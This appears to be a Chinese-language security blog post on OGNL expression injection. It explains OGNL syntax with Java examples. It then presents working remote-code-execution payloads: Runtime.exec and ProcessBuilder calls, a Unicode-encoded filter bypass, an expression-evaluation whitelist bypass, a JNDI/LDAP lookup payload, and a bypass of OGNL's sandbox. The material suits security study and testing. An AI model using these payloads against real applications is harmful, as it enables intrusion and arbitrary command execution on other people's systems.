---
typora-root-url: ../../../static
title: "Ognl_SSTI总结"
date: 2021-06-15T17:07:36+08:00
draft: false
categories: ["security"]
---


## Ognl介绍

Ognl，即对象视图导航语言（Object Graphic Navigation Language）。

使用这种表达式语言可以通过某种表达式语法存取 java 对象的任意属性，调用 Java 对象的方法，以及实现类型转换等。

OGNL 具有以下特点：

- 支持对象方法调用。如 `objName.methodName()`。
- 支持类静态方法调用和值访问，表达式的格式为 `@[类全名（包括包路径）]@[方法名|值名]` 。如 `@java.lang.String@format('fruit%s','frt')` 。
- 支持赋值操作和表达式串联。如 `price=100` ，`discount=0.8` ，在方法 `calculatePrice()` 中进行乘法计算会返回 80。
- **访问 OGNL 上下文（OGNL context）和 ActionContext**。
- 操作集合对象。

## Ognl三要素

**(1) 表达式**

表达式是整个 OGNL 的核心，OGNL 会根据表达式到对象中取值。所有 OGNL 操作都是针对表达式解析后进行的，它表明了此次 OGNL 操作要“做什么”。实际上，表达式就是一个带有语法含义的字符串，这个字符串规定了操作的类型和操作的内容。

**(2) 上下文对象**

上下文对象规定了 OGNL 操作“在哪里进行”。`context` 对象是一个 `Map` 类型的对象，在表达式中访问 `context`  中的对象，需要使用 `#` 号加对象名称，即 `# 对象名称` 的形式。例如要获取 `context` 对象中 `user` 对象的 `username`  值，可以如下书写：

```
#user.username
```

**(3) 根对象**

根对象可以理解为 OGNL 的操作对象，OGNL 可以对根对象进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境。

## Ognl基本语法

**(1) 对root对象的访问**

支持链式访问：

```java
public static void main(String[] args) throws Exception{
    User user = new User();
    user.setAge(22);
    user.setName("p1n93r");
    Address address = new Address();
    address.setProvince("湖南");
    address.setCity("常德");
    user.setAddress(address);
    System.out.println("name = "+Ognl.getValue("name", user));
    System.out.println("age = "+Ognl.getValue("age", user));
    // ognl支持链式调用
    System.out.println("address = "+Ognl.getValue("address.province", user));
}
```

输出：

```
name = p1n93r
age = 22
address = 湖南
```

**(2) 对上下文对象的访问**

向上面那样，如果不设置上下文对象，则 `Ognl` 会创建一个空的 `context` ：

![image-20210914100428914](/media/image-20210914100428914.png)

现在测试设置 `context` 时，访问 `context` 对象，代码如下：

```java
public static void testAccessContext()throws Exception{
    User rootUser = new User();
    rootUser.setName("rootUser");
    User contextUser = new User();
    contextUser.setName("contextUser");
    Map<String, Object> context = new HashMap<>(2);
    context.put("init", "hello");
    context.put("contextUser", contextUser);
    String express = "#contextUser.name";
    String express1 = "#init";
    Object value = Ognl.getValue(express, context, rootUser);
    Object value1 = Ognl.getValue(express1, context, rootUser);
    System.out.println(express+" = "+value);
    System.out.println(express1+" = "+value1);
}
```

输出如下：

```
#contextUser.name = contextUser
#init = hello
```

***注意*** ： `#` 只支持访问 `context` 对象，不支持访问 `root` 对象；

**(3) 对静态成员的访问**

在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式为 `@[class]@[field/method ()]` 。

```
public static void testAccessStatic()throws Exception{
    String[] expressions = {
            "@java.lang.System@out.println(\"hello,I'm an static method access test\")",
            "@java.lang.Integer@MAX_VALUE",
            "@java.lang.Runtime@getRuntime().exec(\"calc\")"
    };
    for (String express : expressions) {
        Object value = Ognl.getValue(express, null);
        System.out.println(express+" = "+value);
    }
}
```

输出为：

```
hello,I'm an static method access test
@java.lang.System@out.println("hello,I'm an static method access test") = null
@java.lang.Integer@MAX_VALUE = 2147483647
@java.lang.Runtime@getRuntime().exec("calc") = java.lang.ProcessImpl@28ba21f3
```

**(4) 方法的调用**

可以直接访问 `root` 对象的 `public` 方法，以及 `context` 对象的 `public` 方法。示例代码如下：

```java
public static void testAccessMethod()throws Exception{
    User rootUser = new User();
    User contextUser = new User();
    Map<String, Object> context = new HashMap<>(2);
    context.put("username", "p1n93r");
    context.put("contextUser", contextUser);
    String[] expressions = {
            "setName(#username)",
            "#contextUser.setName('contextUser')",
    };
    System.out.println("rootUser = "+rootUser);
    System.out.println("contextUser = "+contextUser);
    System.out.println(":::::::::::::::::::::::::::::");
    for (String express : expressions) {
        Object value = Ognl.getValue(express,context,rootUser);
        System.out.println(express+" = "+value);
    }
    System.out.println(":::::::::::::::::::::::::::::");
    System.out.println("rootUser = "+rootUser);
    System.out.println("contextUser = "+contextUser);
}
```

输出如下：

```
rootUser = User(name=null, age=null, address=null)
contextUser = User(name=null, age=null, address=null)
:::::::::::::::::::::::::::::
setName(#username) = null
#contextUser.setName('contextUser') = null
:::::::::::::::::::::::::::::
rootUser = User(name=p1n93r, age=null, address=null)
contextUser = User(name=contextUser, age=null, address=null)
```

**(5) 对数组和集合的访问**

OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。

```java
public static void testAccessCollections()throws Exception{
    Map<String, Object> context = new HashMap<>();
    String[] strings  = {"str-aa", "str-bb"};
    ArrayList<String> list = new ArrayList<>();
    list.add("list-aa");
    list.add("list-bb");
    Map<String, String> map = new HashMap<>();
    map.put("key1", "value1");
    map.put("key2", "value2");
    context.put("list", list);
    context.put("strings", strings);
    context.put("map", map);
    User user = new User();
    String[] expressions = {
            "#strings[0]",
            "#list[0]",
            "#list[0 + 1]",
            "#map['key1']",
            "#map['key' + '2']"
    };
    for (String express : expressions) {
        Object value = Ognl.getValue(express,context, user);
        System.out.println(express+" = "+value);
    }
}
```

输出如下：

```
#strings[0] = str-aa
#list[0] = list-aa
#list[0 + 1] = list-bb
#map['key1'] = value1
#map['key' + '2'] = value2
```

**(6) 投影与选择**

OGNL 支持类似数据库当中的选择与投影功能。

- **投影**：选出集合当中的相同属性组合成一个新的集合。语法为 `collection.{XXX}` ，`XXX ` 就是集合中每个元素的公共属性。

- **选择**：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 `collection.{Y XXX}` ，其中 `Y` 是一个选择操作符，`XXX` 是选择用的逻辑表达式。

选择操作符有 3 种：

-  `?` ：选择满足条件的所有元素
-  `^` ：选择满足条件的第一个元素
-  `$` ：选择满足条件的最后一个元素 

测试代码如下：

```java
public static void testSelection()throws Exception{
    User p1 = new User("name1", 11,null);
    User p2 = new User("name2", 22,null);
    User p3 = new User("name3", 33,null);
    User p4 = new User("name4", 44,null);
    Map<String, Object> context = new HashMap<>();
    ArrayList<User> list = new ArrayList<>();
    list.add(p1);
    list.add(p2);
    list.add(p3);
    list.add(p4);
    context.put("list", list);
    String[] expressions = {
            "#list.{age}",
            "#list.{age + '-' + name}",
            "#list.{? #this.age > 22}",
            "#list.{^ #this.age > 22}",
            "#list.{$ #this.age > 22}"
    };
    for (String express : expressions) {
        Object value = Ognl.getValue(express,context, new User());
        System.out.println(express+" = "+value);
    }
}
```

输出如下：

```
#list.{age} = [11, 22, 33, 44]
#list.{age + '-' + name} = [11-name1, 22-name2, 33-name3, 44-name4]
#list.{? #this.age > 22} = [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]
#list.{^ #this.age > 22} = [User(name=name3, age=33, address=null)]
#list.{$ #this.age > 22} = [User(name=name4, age=44, address=null)]
```

**(7) 创建对象**

OGNL 支持直接使用表达式来创建对象。主要有三种情况：

- 构造 List 对象：使用 `{}` , 中间使用 `,` 进行分割如 `{"aa", "bb", "cc"}` ;
-  构造 Map 对象：使用 `#{}` ，中间使用 `,` 进行分割键值对，键值对使用 `:` 区分，如 `#{"key1" : "value1", "key2" : "value2"}` ;
-  构造任意对象：直接使用已知的对象的构造方法进行构造。

测试代码如下，可以看到， **调用对象构造器创建对象后，还可以链式调用其方法** ：

```java
public static void testCreateObject()throws Exception{
    String[] expressions = {
            "#{'key1':'val1','key2':'val2'}",
            "{1,2,3,4}",
            "(new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start()",
    };
    for (String express : expressions) {
        Object value = Ognl.getValue(express,new User());
        System.out.println(express+" = "+value);
    }
}
```

输出如下：

```
#{'key1':'val1','key2':'val2'} = {key1=val1, key2=val2}
{1,2,3,4} = [1, 2, 3, 4]
(new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start() = java.lang.ProcessImpl@722c41f4
```

## Ognl其他特性

首先看到官方文档：

![image-20210914141153559](/media/image-20210914141153559.png)

大概意思就是：

如果你在Ognl表达式后面再加一个带括号的表达式，并且括号前没有点号。例如：

```
#one(#two)
```

Ognl会将 `#one` 表达式的结算结果， **再次作为一个Ognl表达式去解析** ，并且会将括号内的表达式的计算结果作为本次解析的的root对象。

第一个表达式的计算结果可能是任何类型的对象，如果它是一个 `AST` 类型的对象，那么Ognl会使用这个 `AST` 对象去解析（对应的root对象就是括号内表达式的计算结果）。如果第一个表达式的计算结果不是一个 `AST` 类型的对象，那么Ognl会把它当成一个字符串进行处理，将其转成一个 `AST` 对象然后再去解析。

此外，可能存在一种冲突情况，例如我用如下方式进行上述操作：

```
name(#two)
```

运行后将得到非预期结果，因为这里的 `name` 会被当成root对象的一个方法进行调用，将得到类似如下错误：

```java
java.lang.NoSuchMethodException: com.pinger.javasec.ssti.ognl.pojo.User.name(java.lang.String)
```

要想能正常进行 `Expression Evaluation` ，需要将name括起来，强制性的进行 `Expression Evaluation` ：

```
(name)(#two)
```

这样，Ognl就不会把name当成root对象的方法来调用了。

## Ognl SSTI Sink

**(1) 常规手法**

Ognl SSTI，要能成功解析表达式，需要执行到 `Ognl.getValue()` 或者 `Ognl.setValue()` 才能成功触发。例如 `Ognl.setValue()` 触发RCE：

```java
/**
 * Ognl setValue() SSTI
 */
public static void sinkOne()throws Exception{
    String expression="((new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start())(1)";
    OgnlContext context = new OgnlContext();
    Ognl.setValue(expression,context,"");
}
```

例如 `Ognl.getValue()` 触发RCE：

```java
/**
 * Ognl getValue() SSTI
 */
public static void sinkTwo()throws Exception{
    String expression="(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()";
    OgnlContext context = new OgnlContext();
    Ognl.getValue(expression,context,"");
}
```

这里需要注意的就是，通过 `Ognl.setValue()` 方式来进行SSTI，需要使用Ognl的 `Expression Evaluation` 特性，否则不允许进行创建对象、调用静态方法等操作。而 `Ognl.getValue()` 则不需要考虑这个问题。

此外，还有如下Tips：

- 如果目标存在黑名单，前面说过，Ognl支持链式调用，那么就可以在context或者root对象中，通过链式调用找到可以利用的对象，例如 `org.apache.tomcat.InstanceManager` 对象；
- Ognl支持调用静态方法，所以可以使用 `@java.lang.Runtime@getRuntime().exec('calc')` 的方式进行RCE；
- Ognl支持通过 `new` 创建对象，所以可以使用 `new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()` 进行RCE；

**(2) Bypass手法**

Ognl支持UNICODE编码的表达式，例如如下UNICODE编码的恶意表达式可以成功执行：

```java
public static void sinkFour()throws Exception{
    // @java.lang.Runtime@getRuntime().exec('calc')
    String expression="\\u0040\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0040\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0028\\u0029\\u002e\\u0065\\u0078\\u0065\\u0063\\u0028\\u0027\\u0063\\u0061\\u006c\\u0063\\u0027\\u0029";
    OgnlContext context = new OgnlContext();
    Ognl.getValue(expression,context,"");
}
```

输出：

```
java.lang.ProcessImpl@7506e922
```

此外，前面说到，Ognl支持 `Expression Evaluation` 的特性，基于这个特性，如果我们无法直接执行恶意的表达式，那么我们可以 **先将恶意的Ognl表达式注入到Ognl的context或者root中** ，然后通过 `Expression Evaluation` 特性进行调用。如下所示：

```java
/**
 * 测试ExpressionEvaluation
 */
public static void testExpressionEvaluation()throws Exception{
    // 绕过白名单检查，先讲恶意的Ognl表达式放入Ognl的上下文中
    String one="@java.lang.Runtime@getRuntime().exec('calc')";
    OgnlContext context = new OgnlContext();
    context.put("one",one);
    context.put("two","twotow");
    String attackStr="(#one)(#two)";
    Object value = Ognl.getValue(attackStr, context,"");
    System.out.println(value);
}
```

这里并不是直接执行Ognl表达式，而是先想办法将恶意的Ognl表达式注入到context中，然后通过 `(#one)(#two)` 的方式（ `Expression Evaluation` 特性）进行触发。

最终值得一提的就是，很多时候想RCE，我们不必执着于寻找类似 `Runtime` 和 `ProcessBuilder` 等类， `JNDI` 和 `RMI` 等同样能RCE：）例如：

```java
#InstanceManager = #application['org.apache.tomcat.InstanceManager'],
#rw=#InstanceManager.newInstance('com.sun.rowset.JdbcRowSetImpl'),
#rw.setDataSourceName('ldap://127.0.0.1:10086/InstanceManager'),
#rw.getDatabaseMetaData()
```

最后，如果靶机使用了 `Ognl` 官方的沙箱： `System.setProperty("ognl.security.manager","true");` ，且使用了默认的 `MemeberAccess` ，那么可以使用如下方式进行绕过：

```java
/**
 * Bypass OGNL sandbox
 */
public static void bypassSandBox()throws Exception{
    System.setProperty("ognl.security.manager","true");
    OgnlContext context = new OgnlContext();
    HashMap<String, Object> rootMap = new HashMap<>(1);
    rootMap.put("test","@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS.setAllowPackageProtectedAccess(true),#cmd=new String[]{'calc'},@java.lang.ProcessImpl@start(#cmd,null,null,null,false)");
    context.setRoot(rootMap);
    String express = "(test)('fuckOgnl')";
    Ognl.getValue(express,context, context.getRoot());
}
```

## 参考链接

- https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
- https://commons.apache.org/proper/commons-ognl/language-guide.html
